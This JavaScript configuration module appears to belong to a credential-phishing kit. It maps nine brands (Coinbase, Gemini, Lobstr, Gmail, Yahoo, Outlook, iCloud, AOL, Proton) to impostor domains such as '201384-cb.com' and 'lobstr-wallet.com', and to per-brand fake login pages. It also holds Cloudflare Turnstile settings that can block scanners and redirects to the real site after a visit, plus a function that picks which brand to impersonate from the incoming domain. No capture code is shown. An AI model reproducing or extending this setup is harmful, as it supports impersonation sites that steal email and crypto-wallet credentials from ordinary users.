// Brand-specific configuration including Turnstile keys
// This file should be updated with your actual keys for each domain

const brandConfig = {
  coinbase: {
    name: 'Coinbase',
    prefix: 'CB',
    domains: ['coinbase.com', 'cb.com', '201384-cb.com'],
    officialDomain: 'www.coinbase.com',
    loadingPage: 'loading.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_CB_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_CB_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_CB_ENABLED !== 'false'
    },
    redirectUrl: process.env.CB_REDIRECT_URL || 'https://www.coinbase.com'
  },

  gemini: {
    name: 'Gemini',
    prefix: 'GEMINI',
    domains: ['gemini.com', '206578-gemini.com', 'gemini-crypto.com'],
    officialDomain: 'www.gemini.com',
    loadingPage: 'geminiloading.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_GEMINI_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_GEMINI_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_GEMINI_ENABLED !== 'false'
    },
    redirectUrl: process.env.GEMINI_REDIRECT_URL || 'https://www.gemini.com'
  },

  lobstr: {
    name: 'Lobstr',
    prefix: 'LOBSTR',
    domains: ['lobstr.co', 'lobstr-wallet.com'],
    officialDomain: 'lobstr.co',
    loadingPage: 'lobstrloading.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_LOBSTR_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_LOBSTR_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_LOBSTR_ENABLED !== 'false'
    },
    redirectUrl: process.env.LOBSTR_REDIRECT_URL || 'https://lobstr.co'
  },

  gmail: {
    name: 'Gmail',
    prefix: 'GMAIL',
    domains: ['gmail.com', 'mail.google.com'],
    officialDomain: 'mail.google.com',
    loadingPage: 'gmaillogin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_GMAIL_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_GMAIL_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_GMAIL_ENABLED !== 'false'
    },
    redirectUrl: process.env.GMAIL_REDIRECT_URL || 'https://mail.google.com'
  },

  yahoo: {
    name: 'Yahoo',
    prefix: 'YAHOO',
    domains: ['yahoo.com', 'mail.yahoo.com'],
    officialDomain: 'mail.yahoo.com',
    loadingPage: 'yahoologin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_YAHOO_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_YAHOO_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_YAHOO_ENABLED !== 'false'
    },
    redirectUrl: process.env.YAHOO_REDIRECT_URL || 'https://mail.yahoo.com'
  },

  outlook: {
    name: 'Outlook',
    prefix: 'OUTLOOK',
    domains: ['outlook.com', 'outlook.live.com'],
    officialDomain: 'outlook.live.com',
    loadingPage: 'outlooklogin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_OUTLOOK_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_OUTLOOK_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_OUTLOOK_ENABLED !== 'false'
    },
    redirectUrl: process.env.OUTLOOK_REDIRECT_URL || 'https://outlook.live.com'
  },

  icloud: {
    name: 'iCloud',
    prefix: 'ICLOUD',
    domains: ['icloud.com', 'mail.icloud.com'],
    officialDomain: 'www.icloud.com',
    loadingPage: 'icloudlogin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_ICLOUD_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_ICLOUD_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_ICLOUD_ENABLED !== 'false'
    },
    redirectUrl: process.env.ICLOUD_REDIRECT_URL || 'https://www.icloud.com'
  },

  aol: {
    name: 'AOL',
    prefix: 'AOL',
    domains: ['aol.com', 'mail.aol.com'],
    officialDomain: 'mail.aol.com',
    loadingPage: 'aollogin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_AOL_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_AOL_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_AOL_ENABLED !== 'false'
    },
    redirectUrl: process.env.AOL_REDIRECT_URL || 'https://mail.aol.com'
  },

  proton: {
    name: 'Proton',
    prefix: 'PROTON',
    domains: ['proton.me', 'protonmail.com'],
    officialDomain: 'proton.me',
    loadingPage: 'protonlogin.html',
    turnstile: {
      siteKey: process.env.TURNSTILE_PROTON_SITE_KEY || process.env.CLOUDFLARE_SITE_KEY,
      secretKey: process.env.TURNSTILE_PROTON_SECRET_KEY || process.env.CLOUDFLARE_SECRET_KEY,
      enabled: process.env.TURNSTILE_PROTON_ENABLED !== 'false'
    },
    redirectUrl: process.env.PROTON_REDIRECT_URL || 'https://proton.me'
  }
};

// Helper function to detect brand from domain
function detectBrandFromDomain(domain) {
  if (!domain) return 'gemini';

  const lowerDomain = domain.toLowerCase();

  for (const [brandKey, config] of Object.entries(brandConfig)) {
    for (const brandDomain of config.domains) {
      if (lowerDomain.includes(brandDomain.split('.')[0])) {
        return brandKey;
      }
    }
  }

  return 'gemini';
}

// Get brand configuration
function getBrandConfig(brand) {
  return brandConfig[brand] || brandConfig.gemini;
}

// Get Turnstile configuration for a specific brand
function getTurnstileConfig(brand) {
  const config = getBrandConfig(brand);
  return config.turnstile;
}

// Get all brands with their Turnstile status
function getAllBrandsTurnstileStatus() {
  const status = {};
  for (const [brand, config] of Object.entries(brandConfig)) {
    status[brand] = {
      name: config.name,
      enabled: config.turnstile.enabled,
      hasSiteKey: !!config.turnstile.siteKey,
      hasSecretKey: !!config.turnstile.secretKey,
      domains: config.domains
    };
  }
  return status;
}

export {
  brandConfig,
  detectBrandFromDomain,
  getBrandConfig,
  getTurnstileConfig,
  getAllBrandsTurnstileStatus
};